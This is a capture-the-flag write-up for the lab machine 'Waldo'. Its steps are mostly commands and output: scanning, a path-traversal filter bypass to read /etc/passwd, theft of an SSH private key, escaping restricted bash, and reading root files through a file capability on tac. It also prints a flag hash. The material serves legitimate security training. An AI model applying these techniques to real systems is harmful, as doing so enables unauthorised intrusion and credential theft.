## Waldo

| Name   |      Description |  
|----------|:------------- |
| Machine IP |  10.10.10.87 |
|Difficulty |    Medium   |


## Scanning

### Nmap Scanning

```bash
$ nmap -sC -sV  -oN nmap/waldo -Pn  10.10.10.87
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-15 02:58 EDT
Nmap scan report for 10.10.10.87
Host is up (0.095s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey: 
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.18 second
```




## Enumeration

- Homepage

![homepage](images/homepage.PNG)

- We can see that burp's history, its calling various files

![burp_history](images/burp_history.PNG)

- We can try to read directories and files using path traversal

- Reading directories

![dirRead1](images/dirRead1.PNG)

- Unable to traverse back directories after the first, likely there is a fileter blocking us.
![dirRead2.PNG](images/dirRead2.PNG)

- We can try escaping or use `....//`.
and it worked

![dirRead3.PNG](images/dirRead3.PNG)


- Then read `etc/passwd` using `fileRead.php` to find out the `users` on the machine. use the same technique as above


- `/etc/passwd`

```bash
{"file":"root:x:0:0:root:\/root:\/bin\/ash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nsync:x:5:0:sync:\/sbin:\/bin\/sync\nshutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\nhalt:x:7:0:halt:\/sbin:\/sbin\/halt\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\nnews:x:9:13:news:\/usr\/lib\/news:\/sbin\/nologin\nuucp:x:10:14:uucp:\/var\/spool\/uucppublic:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/bin\/sh\nman:x:13:15:man:\/usr\/man:\/sbin\/nologin\npostmaster:x:14:12:postmaster:\/var\/spool\/mail:\/sbin\/nologin\ncron:x:16:16:cron:\/var\/spool\/cron:\/sbin\/nologin\nftp:x:21:21::\/var\/lib\/ftp:\/sbin\/nologin\nsshd:x:22:22:sshd:\/dev\/null:\/sbin\/nologin\nat:x:25:25:at:\/var\/spool\/cron\/atjobs:\/sbin\/nologin\nsquid:x:31:31:Squid:\/var\/cache\/squid:\/sbin\/nologin\nxfs:x:33:33:X Font Server:\/etc\/X11\/fs:\/sbin\/nologin\ngames:x:35:35:games:\/usr\/games:\/sbin\/nologin\npostgres:x:70:70::\/var\/lib\/postgresql:\/bin\/sh\ncyrus:x:85:12::\/usr\/cyrus:\/sbin\/nologin\nvpopmail:x:89:89::\/var\/vpopmail:\/sbin\/nologin\nntp:x:123:123:NTP:\/var\/empty:\/sbin\/nologin\nsmmsp:x:209:209:smmsp:\/var\/spool\/mqueue:\/sbin\/nologin\nguest:x:405:100:guest:\/dev\/null:\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/home\/nobody:\/bin\/sh\nnginx:x:100:101:nginx:\/var\/lib\/nginx:\/sbin\/nologin\n"}
```

- since we have user `nobody` we can look into his folder for files

![dirRead4_user_nobody.PNG](images/dirRead4_user_nobody.PNG)

![nobody_home](images/nobody_home.PNG)

- We can see `.ssh` folder, use `fileRead.php` to read the contents

![ssh_monitor](images/ssh_monitor.PNG)

![ssh_key](images/ssh_key.PNG)

- Now copy the key and log in as user `nobody`

> Make sure to formate the key

![formatted_ssh_key](images/formatted_ssh_key.PNG)

__Result__

```bash
$ ssh -i id_rsa nobody@10.10.10.87
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ 
```


## Privilege escalation

- On running `linpeas`, nothing found.
but we can log into monitor account with same ssh key

```
waldo:/home$ ls -la
total 12
drwxr-xr-x    1 root     root          4096 May  3  2018 .
drwxr-xr-x    1 root     root          4096 May  3  2018 ..
drwxr-xr-x    1 nobody   nobody        4096 Jul 24  2018 nobody
waldo:/home$ cd nobody/
waldo:~$ ls -la
total 20
drwxr-xr-x    1 nobody   nobody        4096 Jul 24  2018 .
drwxr-xr-x    1 root     root          4096 May  3  2018 ..
lrwxrwxrwx    1 root     root             9 Jul 24  2018 .ash_history -> /dev/null
drwx------    1 nobody   nobody        4096 Jul 15  2018 .ssh
-rw-------    1 nobody   nobody        1202 Jul 24  2018 .viminfo
-r--------    1 nobody   nobody          33 May  3  2018 user.txt
```

```bash
waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.                                                                  
          @@@,@@/ %                                                            
       #*/%@@@@/.&@@,                                                          
   @@@#@@#&@#&#&@@@,*%/                                                        
   /@@@&###########@@&*(*                                                      
 (@################%@@@@@.     /**                                             
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/                               
 %@@@@%##########&@@@....                 .#%#@@@@@@@#                         
 @@&%#########@@@@/                        */@@@%(((@@@%                       
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(                      
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(                     
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,            
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &    
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/   
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&     
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&  
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/   
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@* 
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*   
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(           
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/          
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/          
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@           
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#            
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@              
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#              
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,              
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@               
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@               
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(               
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*                 
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@                    
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,                    
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                     
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#                     
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@                      
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,                      
                          *@@,,,,,,,.,****,..,,,,,,,,&@@                       
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@                        
                           .@@,,,,,,,,,,,,,...,,,,,,@@                         
                            ,@@@,,,,,,,,,,,,,,,,.(@@@                          
                              %@@@@&(,,,,*(#&@@@@@@,     
                              
                            Here's Waldo, where's root?
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found
monitor@waldo:~$ 
````


- We are in a restricted bash.

### Escaping restricted bash

```bash
monitor@waldo:~$ id
-rbash: id: command not found
monitor@waldo:~$ ls
app-dev  bin
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
```

- We can run anything in our `PATH`

```bash
monitor@waldo:~$ ls -la /home/monitor/bin
total 8
dr-xr-x--- 2 root monitor 4096 May  3  2018 .
drwxr-x--- 5 root monitor 4096 Jul 24  2018 ..
lrwxrwxrwx 1 root root       7 May  3  2018 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3  2018 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3  2018 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3  2018 rnano -> /bin/nano

```

```bash
monitor@waldo:~$ ls -la /home/monitor/app-dev
total 2236
drwxrwx--- 3 app-dev monitor    4096 May  3  2018 .
drwxr-x--- 5 root    monitor    4096 Jul 24  2018 ..
-rwxrwx--- 1 app-dev monitor   13704 Jul 24  2018 logMonitor
-r--r----- 1 app-dev monitor   13704 May  3  2018 logMonitor.bak
-rw-rw---- 1 app-dev monitor    2677 May  3  2018 logMonitor.c
-rw-rw---- 1 app-dev monitor     488 May  3  2018 logMonitor.h
-rw-rw---- 1 app-dev monitor 2217712 May  3  2018 logMonitor.h.gch
-rw-rw---- 1 app-dev monitor    6824 May  3  2018 logMonitor.o
-rwxr----- 1 app-dev monitor     266 May  3  2018 makefile
-r-xr-x--- 1 app-dev monitor     795 May  3  2018 .restrictScript.sh
drwxr-x--- 2 app-dev monitor    4096 May  3  2018 v0.1
```
- We can write to `logMonitor` file , if we are `monitor` group and we indeed are.

- using `red` to write

```bash
monitor@waldo:~$ red /bin/bash
1099016
w app-dev/logMonitor
1099016
q
monitor@waldo:~$ logMonitor
tmp.1rJG6ZpjDs: dircolors: command not found
monitor@waldo:~$ bash
tmp.1rJG6ZpjDs: bash: command not found
```

- We now exited the `rbash`, but we can see `command not found`, this is because of our `$PATH`, we can set that manually


- on our kali machine
```bash
─$ echo $PATH 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
```

- copy this and set it in the ictim machine

```bash
monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games
monitor@waldo:~$ bash
```


__Another way__

```bash
monitor@waldo:/tmp$ red
!'/bin/sh'
$ 
```
- now navigate to `/bin` and execute bash

```bash
$ ./bash
bash: dircolors: command not found
monitor@waldo:/bin$
```

- run `./getcap` on `/usr/bin` folder to check what capabilities each binary has

- 
```bash
$ ./getcap -v -r /usr/bin/ 
```
- one binary stands out is `tac`, which has capability `cap_dac_read_search`
```bash
/usr/bin/tac = cap_dac_read_search+ei
```

- `cap_dac_read_search+ei` : This allows to read files as root 

```bash
monitor@waldo:/usr/bin$ ./tac /root/root.txt
8fb67c84418be6e45fbd348fd4584f6c
```

__Escaping rbash via ssh__

```bash
waldo:~/.ssh$ ssh -i.monitor  monitor@127.0.0.1 'echo $PATH'
/usr/local/bin:/usr/bin:/bin:/usr/games
```

- notice the path has changed when run through `ssh`

```bash
waldo:~/.ssh$ ssh -i.monitor  monitor@127.0.0.1 bash
ls
app-dev
bin
cd /bin
ls
bash
bunzip2
busybox
bzcat
bzcmp
bzdiff
bzegrep
```